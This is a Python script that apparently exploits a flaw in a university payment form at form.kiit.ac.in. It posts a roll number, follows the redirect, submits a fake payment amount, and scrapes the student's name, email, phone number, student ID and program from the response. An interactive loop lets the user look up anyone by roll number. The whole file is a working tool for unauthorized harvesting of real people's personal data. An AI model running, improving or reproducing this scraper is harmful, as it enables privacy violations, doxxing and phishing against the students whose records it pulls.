import requests as fetch
import re
import urllib.parse as url

text = {
    "q": "\033[1;34m[ \033[1;35m?\033[1;34m ]\033[0m",
    "w": "\033[1;34m[ \033[1;31m!\033[1;34m ]\033[0m",
    "s": "\033[1;32m[ \033[1;32m+\033[1;32m ]\033[0m",
    "l": "\033[1;33m[ \033[1;33m*\033[1;33m ]\033[0m",
    "c": "\033[1;36m:\033[0m"
}

class Sherlock:
    def __init__(self):
        # Main page we deal with to send request
        self.payment_post_url = "https://form.kiit.ac.in/payment/";

        # Headers originally copied from curl-impersonate since 
        # real ones weren't wroking
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://form.kiit.ac.in"
        }

    
    def find(self, roll_no):
        first_request = fetch.post(self.payment_post_url, headers=self.headers, data={"appno": roll_no}, allow_redirects=False)
        first_request.close();
        
        # Notice that we have allow_redirect=False inorder to idenify the status_code
        # If status_code == 302 then user not found
        # If status_code == 503 well kiit is down again (Rarely)
        if first_request.status_code != 302:
            return {
                "status":"error",
                "message": "Roll number doesn't exist"
            }
        
        if __name__ == "__main__":
            print(f"{text['s']} Roll Number found")
            
        # Doesn't happen ever but why not
        if not "location" in first_request.headers:
            return {
                "status":"error",
                "message": "No redirection URL found"
            }
        
        if __name__ == "__main__":
            print(f"{text['l']} Parsing HTML")
        
        redirect_url = first_request.headers["location"]
        submit_payment_url = url.urljoin(self.payment_post_url, redirect_url)

        # They wish they had this money. Well they do have that much tho
        second_request = fetch.post(submit_payment_url, headers=self.headers, data={'amount': '100000000'})
        
        if second_request.status_code != 200:
            return {
                "status":"error",
                "message": f"Server responded with status code {second_request.status_code}"
            }
            
        try:
            student_id=re.search(r"name=\"student_id\"\svalue=\"(.*)\"", second_request.text).group(1)
            phone_no=re.search(r"name=\"phone\"\svalue=\"(.*)\"", second_request.text).group(1)
            email_id=re.search(r"name=\"email\"\svalue=\"(.*)\"", second_request.text).group(1)
            name=re.search(r"name=\"name\"\svalue=\"(.*)\"", second_request.text).group(1)
            program_des=re.search(r"name=\"Program_Description\"\svalue=\"(.*)\"", second_request.text).group(1)
        except:
            return {
                "status": "error",
                "message": f"Failed to find for text fields"
            }
        
        # Internationals have no phone number in record
        # But can be added through sap portal
        return {
            "status": "success",
            "student_id": student_id,
            "phone_no": "[REDACTED]" if phone_no == "0000000000" else phone_no,
            "email_id": email_id,
            "roll_no": roll_no,
            "name": name,
            "program_des": program_des,
            "is_international": True if phone_no == "0000000000" else False
        }

if __name__ == "__main__":
    spongebob=Sherlock()
    while True:
        roll=input(f"{text['q']} Roll Number: ")
        print(f"{text['l']} Searching.")
        
        details=spongebob.find(roll)
        
        if details["status"] != "error":
            print(f"{text['s']} Name          {text['c']} " + details["name"])
            print(f"{text['s']} E-Mail        {text['c']} " + details["email_id"])
            print(f"{text['s']} Branch        {text['c']} " + details["program_des"])
            print(f"{text['s']} Status        {text['c']} " + details["status"])
            print(f"{text['s']} Phone No      {text['c']} " + details["phone_no"])
            print(f"{text['s']} International {text['c']}", details["is_international"])
            print(f"{text['s']} Roll Number   {text['c']} " + details["roll_no"])
            print(f"{text['s']} Student ID    {text['c']} " + details["student_id"])
        else:
            print(text["w"] + details["message"])